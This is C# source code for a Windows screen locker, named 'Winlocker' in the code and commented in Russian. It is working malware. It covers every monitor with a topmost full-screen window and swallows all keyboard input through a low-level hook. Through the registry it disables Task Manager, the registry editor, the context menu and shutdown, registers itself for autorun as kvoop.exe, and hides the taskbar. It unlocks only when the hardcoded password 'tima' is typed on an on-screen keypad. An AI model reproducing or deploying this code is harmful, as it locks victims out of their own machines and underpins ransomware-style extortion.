using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Security.Principal;

namespace Winlocker
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        // Перекрывание второго монитора второй формой
        public Screen GetSecondaryScreen()
        {
            if (Screen.AllScreens.Length == 1)
            {
                return null;
            }
            foreach (Screen screen in Screen.AllScreens)
            {
                if (screen.Primary == false)
                {
                    return screen;
                }
            }
            return null;
        }

        private void Show_all_monitors(int a)
        {
            if (a == 2)
            {
                Form2 frm = new Form2();
                Screen screen = GetSecondaryScreen();
                frm.TopMost = true;
                frm.StartPosition = FormStartPosition.Manual;
                frm.FormBorderStyle = FormBorderStyle.None;
                frm.WindowState = FormWindowState.Maximized;
                frm.Location = screen.WorkingArea.Location;
                frm.Size = new Size(screen.WorkingArea.Width, screen.WorkingArea.Height);
                frm.Show();
            }
        }

        // Блокировка событий ввода с клавиатуры, за исключением ctrl + alt + delete, ctrl + l
        private delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

        [DllImport("user32.dll", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi)]
        private static extern int SetWindowsHookEx(
          int idHook,
          LowLevelKeyboardProcDelegate lpfn,
          int hMod,
          int dwThreadId);

        [DllImport("user32.dll")]
        private static extern int UnhookWindowsHookEx(int hHook);

        [DllImport("user32.dll", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi)]
        private static extern int CallNextHookEx(
          int hHook, int nCode,
          int wParam, ref KBDLLHOOKSTRUCT lParam);

        const int WH_KEYBOARD_LL = 13;
        private int intLLKey;

        private struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            int scanCode;
            public int flags;
            int time;
            int dwExtraInfo;
        }

        private int LowLevelKeyboardProc(
          int nCode, int wParam,
          ref KBDLLHOOKSTRUCT lParam)
        {
            bool blnEat = true;
            if (blnEat)
                return 1;
            else return CallNextHookEx(0, nCode, wParam, ref lParam);
        }
        LowLevelKeyboardProcDelegate del;

        private void KeyboardHook(object sender, EventArgs e)
        {
            del = new LowLevelKeyboardProcDelegate(LowLevelKeyboardProc);
            intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, del, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
        }

        // Блокировка запуска диспетчера задач
        private class TaskManager
        {
            public static void Lock()
            {
                RegistryKey reg;
                string key = "1";
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

                reg = Registry.CurrentUser.CreateSubKey(sub);
                reg.SetValue("DisableTaskMgr", key);
                reg.Close();
            }
            public static void Unlock()
            {
                RegistryKey reg;
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

                reg = Registry.CurrentUser.OpenSubKey(sub, true);
                reg.DeleteValue("DisableTaskMgr");
                reg.Close();
            }
        }

        // Блокировка запуска редактора реестра
        private class Registry_editor
        {
            public static void Lock()
            {
                RegistryKey reg;
                string key = "1";
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

                reg = Registry.CurrentUser.CreateSubKey(sub);
                reg.SetValue("DisableRegistryTools", key, RegistryValueKind.DWord);
                reg.Close();
            }
            public static void Unlock()
            {
                RegistryKey reg;
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

                reg = Registry.CurrentUser.OpenSubKey(sub, true);
                reg.DeleteValue("DisableRegistryTools");
                reg.Close();
            }
        }

        // Блокировка правой кнопки мыши
        private static class Right_click
        {
            #region Control
            public static void Lock()
            {
                RegistryKey reg;
                string key = "1";
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

                reg = Registry.LocalMachine.CreateSubKey(sub);
                reg.SetValue("NoViewContextMenu", key);
                reg.Close();

            }
            public static void Unlock()
            {
                RegistryKey reg;
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

                reg = Registry.LocalMachine.OpenSubKey(sub, true);
                reg.DeleteValue("NoViewContextMenu");
                reg.Close();
            }
            #endregion
        }

        // Блокировка кнопки перезагрузки в пространстве ctrl + alt + delete
        private static class Rebooting
        {
            public static void Lock()
            {
                RegistryKey reg;
                string key = "1";
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

                reg = Registry.LocalMachine.OpenSubKey(sub, true);
                reg.SetValue("NoClose", key, RegistryValueKind.DWord);
                reg.Close();
            }

            public static void Unlock()
            {
                RegistryKey reg;
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

                reg = Registry.LocalMachine.OpenSubKey(sub, true);
                reg.DeleteValue("NoClose");
                reg.Close();
            }
        }

        // Добавление в автозагрузку
        private static class Autorun
        {
            public static void Set()
            {
                try
                {
                    RegistryKey reg_1;
                    RegistryKey reg_2;
                    string key = "C:\\Windows\\kvoop.exe";

                    string sub_1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
                    string sub_2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run";

                    reg_1 = Registry.LocalMachine.CreateSubKey(sub_1);
                    reg_1.SetValue("kvoop_t", key, RegistryValueKind.String);
                    reg_1.Close();

                    reg_2 = Registry.LocalMachine.CreateSubKey(sub_2);
                    reg_2.SetValue("kvoop_t", key, RegistryValueKind.String);
                    reg_2.Close();
                }
                catch
                {
                    RegistryKey reg;
                    string key = "C:\\Windows\\kvoop.exe";
                    string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run";
                    reg = Registry.LocalMachine.CreateSubKey(sub);
                    reg.SetValue("kvoop_t", key, RegistryValueKind.String);
                    reg.Close();
                }
            }
            public static void Unset()
            {
                try
                {
                    RegistryKey reg_1;
                    string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

                    reg_1 = Registry.LocalMachine.OpenSubKey(sub, true);
                    reg_1.DeleteValue("kvoop_t");
                    reg_1.Close();

                    RegistryKey reg_2 = Registry.LocalMachine;
                    reg_2.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run");
                    reg_2.Close();
                }

                catch
                {
                    RegistryKey reg = Registry.LocalMachine;
                    reg.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run");
                    reg.Close();
                }
            }
        }

        // Проверка на наличие прав локального администратора
        public static bool isAdmin()
        {
            WindowsPrincipal principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdminRight = principal.IsInRole(WindowsBuiltInRole.Administrator);
            return hasAdminRight;
        }

        // Скрытие панели задач
        private static class TaskBar
        {
            [DllImport("user32.dll")]
            private static extern int FindWindow(string className, string windowText);

            [DllImport("user32.dll")]
            private static extern int ShowWindow(int hwnd, int command);

            private const int SW_HIDE = 0;
            private const int SW_SHOW = 1;

            private static int Handle => FindWindow("Shell_TrayWnd", "");
            private static int StartHandle => FindWindow("Button", "Пуск");
            private static void HideTaskBar() => ShowWindow(Handle, SW_HIDE);
            private static void HideStartButton() => ShowWindow(StartHandle, SW_HIDE);
            private static void ShowTaskBar() => ShowWindow(Handle, SW_SHOW);
            private static void ShowStartButton() => ShowWindow(StartHandle, SW_SHOW);

            #region Control
            public static void Lock()
            {
                HideTaskBar();
                HideStartButton();
            }
            public static void Unlock()
            {
                ShowTaskBar();
                ShowStartButton();
            }
            #endregion
        }
        
        private void Form1_Load(object sender, EventArgs e)
        {
            if (isAdmin())
            {
                try
                {
                    this.WindowState = FormWindowState.Maximized;
                    this.FormBorderStyle = FormBorderStyle.None;
                    this.TopMost = true;

                    KeyboardHook(this, e);
                    TaskManager.Lock();
                    Registry_editor.Lock();
                    Right_click.Lock();
                    Rebooting.Lock();
                    Autorun.Set();
                    TaskBar.Lock();

                    if (Screen.AllScreens.Length > 1)
                    {
                        Show_all_monitors(Screen.AllScreens.Length);
                    }
                }
                catch
                {
                    MessageBox.Show(
                    "Что то пошло не так!",
                    "Сообщение",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Information,
                    MessageBoxDefaultButton.Button1,
                    MessageBoxOptions.DefaultDesktopOnly);
                }               

            }
            else
            {
                MessageBox.Show(
                "Запустите с правами локального администратора",
                "Сообщение",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Information,
                MessageBoxDefaultButton.Button1,
                MessageBoxOptions.DefaultDesktopOnly);
            }
        }
        private void button_unlock_Click(object sender, EventArgs e)
        {
            String password = textBox.Text;

            if (password == "tima") // Пароль для разблокировки
            {
                try
                {
                    TaskManager.Unlock();
                    Registry_editor.Unlock();
                    Right_click.Unlock();
                    Rebooting.Unlock();
                    Autorun.Unset();
                    TaskBar.Unlock();
                    this.Close();
                }
                catch
                {
                    MessageBox.Show(
                    "Разблокировка не удалась",
                    "Unlocking",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Information,
                    MessageBoxDefaultButton.Button1,
                    MessageBoxOptions.DefaultDesktopOnly);
                }
            }
            else
            {
                textBox.Clear();
            }
        }

        private void button_1_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "1";
        }

        private void button_2_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "2";
        }

        private void button_3_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "3";
        }

        private void button_4_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "4";
        }

        private void button_5_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "5";
        }

        private void button_6_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "6";
        }

        private void button_7_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "7";
        }

        private void button_8_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "8";
        }

        private void button_9_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "9";
        }

        private void button_0_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "0";
        }

        private void button_q_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "q";
        }

        private void button_w_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "w";
        }

        private void button_e_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "e";
        }

        private void button_r_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "r";
        }

        private void button_t_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "t";
        }

        private void button_y_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "y";
        }

        private void button_u_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "u";
        }

        private void button_i_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "i";
        }

        private void button_o_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "o";
        }

        private void button_p_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "p";
        }

        private void button_a_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "a";
        }

        private void button_s_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "s";
        }

        private void button_d_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "d";
        }

        private void button_f_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "f";
        }

        private void button_g_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "g";
        }

        private void button_h_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "h";
        }

        private void button_j_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "j";
        }

        private void button_k_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "k";
        }

        private void button_l_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "l";
        }

        private void button_z_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "z";
        }

        private void button_x_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "x";
        }

        private void button_c_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "c";
        }

        private void button_v_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "v";
        }

        private void button_b_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "b";
        }

        private void button_n_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "n";
        }

        private void button_m_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "m";
        }

        private void button_sym1_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "[";
        }

        private void button_sym2_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "]";
        }

        private void button_sym3_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + ";";
        }

        private void button_sym4_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "+";
        }

        private void button_sym5_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "-";
        }

        private void button_sym6_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + ",";
        }

        private void button_sym7_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + ".";
        }

        private void button_sym8_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "!";
        }

        private void button_sum9_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "@";
        }

        private void button_sym10_Click(object sender, EventArgs e)
        {
            textBox.Text = textBox.Text + "#";
        }

        private void button_backspace_Click(object sender, EventArgs e)
        {
            int textlength = textBox.Text.Length;
            if (textlength > 0)
            {
                textBox.Text = textBox.Text.Substring(0, textlength - 1);
            }
            textBox.Focus();
            textBox.SelectionStart = textBox.Text.Length;
            textBox.SelectionLength = 0;
        }
    }
}
